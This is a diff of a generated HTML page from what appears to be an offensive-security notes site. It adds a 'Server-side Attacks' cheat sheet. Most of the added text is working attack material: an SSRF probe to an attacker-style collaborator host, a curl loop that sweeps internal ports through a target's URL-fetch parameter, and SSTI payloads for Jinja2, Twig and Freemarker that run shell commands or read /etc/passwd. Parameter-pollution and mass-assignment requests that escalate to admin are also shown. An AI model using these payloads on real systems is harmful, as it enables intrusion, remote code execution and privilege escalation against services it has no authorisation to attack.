@@ -165,7 +165,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#readme" class="md-skip">
+        <a href="#server-side-attacks" class="md-skip">
           Skip to content
         </a>
       
@@ -1303,6 +1303,24 @@
         
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Server-side Attacks
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -1319,6 +1337,108 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSRF
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssti-server-side-template-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSTI (Server-Side Template Injection)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SSTI (Server-Side Template Injection)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jinja2-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Jinja2 RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#twig-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Twig RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#freemarker-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Freemarker RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-parameter-pollution-hpp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP Parameter Pollution (HPP)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mass-assignment" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Mass Assignment
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -2841,6 +2961,97 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSRF
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssti-server-side-template-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSTI (Server-Side Template Injection)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SSTI (Server-Side Template Injection)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jinja2-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Jinja2 RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#twig-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Twig RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#freemarker-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Freemarker RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-parameter-pollution-hpp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP Parameter Pollution (HPP)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mass-assignment" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Mass Assignment
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -2859,7 +3070,60 @@
   
 
 
-<h1 id="readme">README<a class="headerlink" href="#readme" title="Permanent link">&para;</a></h1>
+<h1 id="server-side-attacks">Server-side Attacks<a class="headerlink" href="#server-side-attacks" title="Permanent link">&para;</a></h1>
+<p>Advanced server-side vulnerabilities — SSRF, SSTI, and server-side request abuse leading to information disclosure and RCE.</p>
+<h2 id="ssrf">SSRF<a class="headerlink" href="#ssrf" title="Permanent link">&para;</a></h2>
+<p>See <a href="../Web%20Attacks/">Web Attacks</a> for full SSRF reference.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Quick test: does server fetch external URLs?</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nv">url</span><span class="o">=</span>http://attacker-burp-collaborator.com/test
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="c1"># Internal port sweep</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="k">for</span><span class="w"> </span>port<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">443</span><span class="w"> </span><span class="m">3306</span><span class="w"> </span><span class="m">5432</span><span class="w"> </span><span class="m">6379</span><span class="w"> </span><span class="m">8080</span><span class="w"> </span><span class="m">8443</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;http://target.com/fetch?url=http://127.0.0.1:</span><span class="nv">$port</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">&amp;</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="k">done</span>
+</span></code></pre></div>
+<h2 id="ssti-server-side-template-injection">SSTI (Server-Side Template Injection)<a class="headerlink" href="#ssti-server-side-template-injection" title="Permanent link">&para;</a></h2>
+<p>Detect by injecting math expressions — if result is computed, template engine is vulnerable.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a># Detection probes
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>{{7*7}}           → 49 (Jinja2, Twig)
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>${7*7}            → 49 (Freemarker, Velocity, EL)
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>&lt;%= 7*7 %&gt;        → 49 (ERB - Ruby)
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>#{7*7}            → 49 (Ruby interpolation)
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>{{7*&#39;7&#39;}}         → 7777777 → Jinja2
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>{{7*&#39;7&#39;}}         → 49 → Twig
+</span></code></pre></div>
+<h3 id="jinja2-rce">Jinja2 RCE<a class="headerlink" href="#jinja2-rce" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Read file</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="p">{{</span> <span class="n">config</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;cat /etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="c1"># Simpler if builtins available</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="p">{{</span> <span class="bp">self</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="c1"># From empty dict</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">396</span><span class="p">](</span><span class="s1">&#39;id&#39;</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span><span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()}}</span>
+</span></code></pre></div>
+<h3 id="twig-rce">Twig RCE<a class="headerlink" href="#twig-rce" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>{{[&#39;id&#39;]|filter(&#39;system&#39;)}}
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>{{&#39;/etc/passwd&#39;|file_excerpt(1,30)}}
+</span></code></pre></div>
+<h3 id="freemarker-rce">Freemarker RCE<a class="headerlink" href="#freemarker-rce" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>${&quot;freemarker.template.utility.Execute&quot;?new()(&quot;id&quot;)}
+</span></code></pre></div>
+<h2 id="http-parameter-pollution-hpp">HTTP Parameter Pollution (HPP)<a class="headerlink" href="#http-parameter-pollution-hpp" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a># Duplicate parameters — server behavior depends on framework
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>?id=1&amp;id=2
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a># Django/Flask take first; PHP/ASP take last
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a># Exploit: bypass WAF rule that checks first param, backend uses second
+</span></code></pre></div>
+<h2 id="mass-assignment">Mass Assignment<a class="headerlink" href="#mass-assignment" title="Permanent link">&para;</a></h2>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="err">#</span><span class="w"> </span><span class="err">API</span><span class="w"> </span><span class="err">accep</span><span class="kc">ts</span><span class="w"> </span><span class="err">ex</span><span class="kc">tra</span><span class="w"> </span><span class="kc">f</span><span class="err">ields</span><span class="w"> </span><span class="kc">t</span><span class="err">ha</span><span class="kc">t</span><span class="w"> </span><span class="err">map</span><span class="w"> </span><span class="kc">t</span><span class="err">o</span><span class="w"> </span><span class="err">i</span><span class="kc">nternal</span><span class="w"> </span><span class="err">model</span><span class="w"> </span><span class="err">proper</span><span class="kc">t</span><span class="err">ies</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="err">PATCH</span><span class="w"> </span><span class="err">/api/user/</span><span class="mi">1</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="p">{</span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;John&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;role&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="p">}</span><span class="w">   </span><span class="err">#</span><span class="w"> </span><span class="err">i</span><span class="kc">f</span><span class="w"> </span><span class="err">role</span><span class="w"> </span><span class="err">is</span><span class="w"> </span><span class="err">i</span><span class="kc">n</span><span class="w"> </span><span class="err">model</span><span class="p">,</span><span class="w"> </span><span class="err">may</span><span class="w"> </span><span class="err">be</span><span class="w"> </span><span class="err">accep</span><span class="kc">te</span><span class="err">d</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="err">#</span><span class="w"> </span><span class="err">Or</span><span class="w"> </span><span class="err">i</span><span class="kc">n</span><span class="w"> </span><span class="err">regis</span><span class="kc">trat</span><span class="err">io</span><span class="kc">n</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="p">{</span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="s2">&quot;john&quot;</span><span class="p">,</span><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="s2">&quot;pass&quot;</span><span class="p">,</span><span class="nt">&quot;isAdmin&quot;</span><span class="p">:</span><span class="kc">true</span><span class="p">}</span>
+</span></code></pre></div>
 
 
 
